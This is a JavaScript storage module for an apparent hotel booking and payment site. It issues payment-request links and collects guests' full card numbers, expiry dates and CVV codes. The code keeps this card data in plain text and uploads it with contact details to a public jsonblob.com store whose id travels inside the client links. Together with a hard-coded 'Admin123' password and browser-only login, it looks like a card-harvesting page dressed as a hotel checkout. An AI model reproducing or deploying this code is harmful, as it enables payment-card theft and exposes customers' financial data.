/* THE BEYBÛN HOTEL — local + shared cloud store */
(function (global) {
  var KEYS = {
    contacts: "beybun-contacts",
    payments: "beybun-payments",
    adminHash: "beybun-admin-auth-v2",
    session: "beybun-admin-session",
    syncId: "beybun-sync-id"
  };

  var ADMIN_USERNAME = "Mustafa.Beybun";
  var DEFAULT_PASSWORD = "Admin123";
  var JSONBLOB = "https://jsonblob.com/api/jsonBlob";

  function read(key, fallback) {
    try {
      var raw = localStorage.getItem(key);
      if (!raw) return fallback;
      return JSON.parse(raw);
    } catch (e) {
      return fallback;
    }
  }

  function write(key, value) {
    localStorage.setItem(key, JSON.stringify(value));
  }

  function uid(prefix) {
    var n = Math.floor(100000 + Math.random() * 900000);
    return (prefix || "ID") + "-" + n;
  }

  function sha256(text) {
    var data = new TextEncoder().encode(text);
    return crypto.subtle.digest("SHA-256", data).then(function (buf) {
      return Array.from(new Uint8Array(buf))
        .map(function (b) { return b.toString(16).padStart(2, "0"); })
        .join("");
    });
  }

  function ensureAdminHash() {
    if (localStorage.getItem(KEYS.adminHash)) {
      return Promise.resolve(localStorage.getItem(KEYS.adminHash));
    }
    return sha256(DEFAULT_PASSWORD).then(function (hash) {
      localStorage.setItem(KEYS.adminHash, hash);
      return hash;
    });
  }

  function getSyncId() {
    return localStorage.getItem(KEYS.syncId) || "";
  }

  function setSyncId(id) {
    if (id) localStorage.setItem(KEYS.syncId, id);
  }

  function cloudUrl(id) {
    return JSONBLOB + "/" + id;
  }

  function pullCloud() {
    var id = getSyncId();
    if (!id) return Promise.resolve(null);
    return fetch(cloudUrl(id), {
      headers: { Accept: "application/json" }
    })
      .then(function (res) {
        if (!res.ok) throw new Error("pull failed");
        return res.json();
      })
      .then(function (data) {
        if (!data || typeof data !== "object") return null;
        if (Array.isArray(data.payments)) write(KEYS.payments, data.payments);
        if (Array.isArray(data.contacts)) write(KEYS.contacts, data.contacts);
        return data;
      })
      .catch(function () {
        return null;
      });
  }

  function pushCloud() {
    var id = getSyncId();
    var payload = {
      payments: read(KEYS.payments, []),
      contacts: read(KEYS.contacts, []),
      updatedAt: new Date().toISOString()
    };
    if (!id) {
      return fetch(JSONBLOB, {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
          Accept: "application/json"
        },
        body: JSON.stringify(payload)
      })
        .then(function (res) {
          if (!res.ok) throw new Error("create failed");
          var loc = res.headers.get("Location") || "";
          var parts = loc.split("/");
          var newId = parts[parts.length - 1];
          if (!newId) throw new Error("no sync id");
          setSyncId(newId);
          return newId;
        })
        .catch(function () {
          return "";
        });
    }
    return fetch(cloudUrl(id), {
      method: "PUT",
      headers: {
        "Content-Type": "application/json",
        Accept: "application/json"
      },
      body: JSON.stringify(payload)
    })
      .then(function () {
        return id;
      })
      .catch(function () {
        return id;
      });
  }

  function ensureSync() {
    if (getSyncId()) {
      return pullCloud().then(function () {
        return getSyncId();
      });
    }
    return pushCloud();
  }

  var Store = {
    adminUsername: ADMIN_USERNAME,
    defaultPassword: DEFAULT_PASSWORD,

    getContacts: function () {
      return read(KEYS.contacts, []);
    },

    addContact: function (payload) {
      var list = Store.getContacts();
      var item = Object.assign({ id: uid("CT"), createdAt: new Date().toISOString(), status: "new" }, payload);
      list.unshift(item);
      write(KEYS.contacts, list);
      pushCloud();
      return item;
    },

    markContactRead: function (id) {
      var list = Store.getContacts().map(function (c) {
        if (c.id === id) c.status = "read";
        return c;
      });
      write(KEYS.contacts, list);
      pushCloud();
    },

    deleteContact: function (id) {
      write(KEYS.contacts, Store.getContacts().filter(function (c) { return c.id !== id; }));
      pushCloud();
    },

    getPayments: function () {
      return read(KEYS.payments, []);
    },

    getPaymentByNumber: function (number) {
      var code = String(number || "").trim().toUpperCase();
      return Store.getPayments().find(function (p) { return p.requestNumber === code; }) || null;
    },

    createPaymentRequest: function (payload) {
      var item = {
        id: uid("PR"),
        requestNumber: "BB-" + Math.floor(100000 + Math.random() * 900000),
        clientName: payload.clientName,
        phone: payload.phone || "",
        email: payload.email || "",
        room: payload.room || "",
        checkin: payload.checkin,
        checkout: payload.checkout,
        dailyCost: Number(payload.dailyCost) || 0,
        totalCost: Number(payload.totalCost) || 0,
        downPayment: Number(payload.downPayment) || 0,
        notes: payload.notes || "",
        status: "awaiting_payment",
        card: null,
        createdAt: new Date().toISOString()
      };
      var list = Store.getPayments();
      list.unshift(item);
      write(KEYS.payments, list);
      pushCloud();
      return item;
    },

    encodePaymentPayload: function (payment) {
      var slim = {
        requestNumber: payment.requestNumber,
        clientName: payment.clientName,
        phone: payment.phone,
        email: payment.email,
        room: payment.room,
        checkin: payment.checkin,
        checkout: payment.checkout,
        dailyCost: payment.dailyCost,
        totalCost: payment.totalCost,
        downPayment: payment.downPayment,
        status: payment.status || "awaiting_payment",
        syncId: getSyncId() || ""
      };
      return btoa(unescape(encodeURIComponent(JSON.stringify(slim))))
        .replace(/\+/g, "-")
        .replace(/\//g, "_")
        .replace(/=+$/g, "");
    },

    decodePaymentPayload: function (token) {
      try {
        var b64 = String(token).replace(/-/g, "+").replace(/_/g, "/");
        while (b64.length % 4) b64 += "=";
        var json = decodeURIComponent(escape(atob(b64)));
        var data = JSON.parse(json);
        if (!data || !data.requestNumber) return null;
        return data;
      } catch (e) {
        return null;
      }
    },

    upsertPaymentFromPayload: function (data) {
      if (!data || !data.requestNumber) return null;
      if (data.syncId) setSyncId(data.syncId);
      var existing = Store.getPaymentByNumber(data.requestNumber);
      if (existing) return existing;
      var item = {
        id: uid("PR"),
        requestNumber: String(data.requestNumber).toUpperCase(),
        clientName: data.clientName || "",
        phone: data.phone || "",
        email: data.email || "",
        room: data.room || "",
        checkin: data.checkin || "",
        checkout: data.checkout || "",
        dailyCost: Number(data.dailyCost) || 0,
        totalCost: Number(data.totalCost) || 0,
        downPayment: Number(data.downPayment) || 0,
        notes: "",
        status: data.status || "awaiting_payment",
        card: null,
        createdAt: new Date().toISOString()
      };
      var list = Store.getPayments();
      list.unshift(item);
      write(KEYS.payments, list);
      pushCloud();
      return item;
    },

    updatePayment: function (requestNumber, patch) {
      var list = Store.getPayments().map(function (p) {
        if (p.requestNumber === requestNumber) {
          return Object.assign({}, p, patch);
        }
        return p;
      });
      write(KEYS.payments, list);
      return pushCloud().then(function () {
        return Store.getPaymentByNumber(requestNumber);
      });
    },

    submitCard: function (requestNumber, card) {
      return Store.updatePayment(requestNumber, {
        status: "processing",
        card: {
          holder: card.holder,
          number: card.number,
          expiry: card.expiry,
          cvv: card.cvv,
          submittedAt: new Date().toISOString()
        }
      });
    },

    deletePayment: function (requestNumber) {
      write(KEYS.payments, Store.getPayments().filter(function (p) { return p.requestNumber !== requestNumber; }));
      pushCloud();
    },

    ensureAdmin: ensureAdminHash,
    ensureSync: ensureSync,
    pullCloud: pullCloud,
    pushCloud: pushCloud,
    getSyncId: getSyncId,

    login: function (username, password) {
      if (String(username || "").trim() !== ADMIN_USERNAME) {
        return Promise.resolve(false);
      }
      return ensureAdminHash().then(function (hash) {
        return sha256(password).then(function (attempt) {
          if (attempt !== hash) return false;
          sessionStorage.setItem(KEYS.session, "ok:" + Date.now());
          return ensureSync().then(function () {
            return true;
          });
        });
      });
    },

    logout: function () {
      sessionStorage.removeItem(KEYS.session);
    },

    isLoggedIn: function () {
      return String(sessionStorage.getItem(KEYS.session) || "").indexOf("ok:") === 0;
    },

    changePassword: function (username, currentPassword, newPassword) {
      return Store.login(username, currentPassword).then(function (ok) {
        if (!ok) return false;
        return sha256(newPassword).then(function (hash) {
          localStorage.setItem(KEYS.adminHash, hash);
          return true;
        });
      });
    },

    luhnValid: function (number) {
      var digits = String(number).replace(/\D/g, "");
      if (digits.length < 13 || digits.length > 19) return false;
      var sum = 0;
      var alt = false;
      for (var i = digits.length - 1; i >= 0; i--) {
        var n = parseInt(digits.charAt(i), 10);
        if (alt) {
          n *= 2;
          if (n > 9) n -= 9;
        }
        sum += n;
        alt = !alt;
      }
      return sum % 10 === 0;
    },

    formatCard: function (number) {
      return String(number).replace(/\D/g, "").replace(/(\d{4})(?=\d)/g, "$1 ").trim();
    },

    maskCard: function (number) {
      var d = String(number).replace(/\D/g, "");
      if (d.length < 4) return d;
      return "•••• •••• •••• " + d.slice(-4);
    }
  };

  global.BeybunStore = Store;
})(window);
